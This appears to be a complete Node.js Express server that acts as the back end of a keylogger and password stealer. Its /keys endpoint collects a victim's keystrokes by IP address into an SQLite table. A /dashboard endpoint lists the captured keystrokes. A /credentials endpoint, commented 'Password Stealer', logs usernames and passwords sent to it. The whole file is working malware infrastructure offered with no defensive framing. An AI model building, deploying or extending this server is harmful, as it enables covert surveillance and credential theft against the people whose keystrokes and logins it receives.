import express from 'express';
import sqlite3 from 'sqlite3';

const app = express();
const PORT = 8081;

// Initialize Database - Start
const db = new sqlite3.Database(':memory:', (err) => {
  if (err) {
    return console.error(err.message);
  }
  console.log('Connected to the in-memory SQLite database');
});

db.serialize(() => {
  const sql = 'CREATE TABLE IF NOT EXISTS keys (ipaddr TEXT, keypresses TEXT)';
  db.run(sql, (err) => {
    if (err) {
      console.error(err.message);
    }
    console.log('Table "keys" created');
  });
});
// Initialize Database - End


// Middleware - Start
app.use((req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next();
});
// Middleware - End

app.get('/', (req, res) => {
  res.send('Hello, world!');
});

app.get('/keys', (req, res) => {
  const k = req.query.k;
  if (k || k == ' ') {
    insertOrUpdateKeys(db, req.ip, k);
    res.sendStatus(200);
  } else {
    res.send('Query parameter \'k\' is not provided');
  }
});

app.get('/dashboard', (req, res) => {
  const sql = 'SELECT ipaddr, keypresses FROM keys';
  db.all(sql, [], (err, rows) => {
    if (err) {
      res.status(500).json({error: err.message});
      return;
    }
    res.json({data: rows});
  });
});

// Password Stealer - BEGIN
app.get('/credentials', (req, res) => {
  const u = req.query.u;
  const p = req.query.p;

  if (u && p) {
    const username = decodeURIComponent(u);
    const password = decodeURIComponent(p);
    console.log({username: username, password: password});
  } else {
    res.send('Query parameters \'u\' and \'p\' are not provided');
  }
});
// Password Stealer - END

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`Keylogger server listening at http://0.0.0.0:${PORT}`);
});

/**
 * Inserts key into corresponding row or updates the value of an existing row.
 * @param {string} db - database connection.
 * @param {string} ipaddr - Victim's IP that gets associated with keypresses.
 * @param {string} key - Victim's keypress.
 **/
function insertOrUpdateKeys(db, ipaddr, key) {
  const sqlSelect = 'SELECT keypresses FROM keys WHERE ipaddr = ?';
  const sqlInsert = 'INSERT INTO keys (ipaddr, keypresses) VALUES (?, ?)';
  const sqlUpdate = 'UPDATE keys SET keypresses = ? WHERE ipaddr = ?';

  db.get(sqlSelect, [ipaddr], (err, row) => {
    if (err) {
      console.error(err.message);
    }

    if (row) {
      const keypresses = row.keypresses + key;
      db.run(sqlUpdate, [keypresses, ipaddr], (err) => {
        if (err) {
          console.error(err.message);
        }
        console.log('Row updated!');
      });
    } else {
      db.run(sqlInsert, [ipaddr, key], (err) => {
        if (err) {
          console.error(err.message);
        }
        console.log('Row inserted!');
      });
    }
  });
}


// Graceful Shutdown
process.on('SIGTERM', () => {
  console.debug('\nSIGTERM signal received: closing server and database conn');

  db.close((err) => {
    if (err) {
      return console.error(err.message);
    }

    console.debug('Database connection closed');
  });

  server.close(() => {
    console.debug('HTTP server closed');
  });
});

process.on('SIGINT', () => {
  console.debug('\nSIGINT signal received: closing server and database conn.');

  db.close((err) => {
    if (err) {
      return console.error(err.message);
    }

    console.debug('Database connection closed');
  });

  server.close(() => {
    console.debug('HTTP server closed');
  });
});
